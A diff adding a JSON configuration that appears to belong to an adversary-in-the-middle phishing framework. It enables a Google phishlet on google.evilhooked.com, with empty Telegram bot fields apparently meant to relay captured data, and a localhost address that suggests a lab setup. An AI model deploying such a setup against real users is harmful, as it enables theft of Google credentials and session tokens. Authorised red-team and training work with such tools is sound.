@@ -1,0 +1,24 @@
+{
+  "blacklist": { "mode": "unauth" },
+  "general": {
+    "autocert": true,
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": "evilhooked.com",
+    "external_ipv4": "127.0.0.1",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    "chatid": "",
+    "teletoken": ""
+  },
+  "lures": [],
+  "phishlets": {
+    "google": {
+      "hostname": "google.evilhooked.com",
+      "unauth_url": "",
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
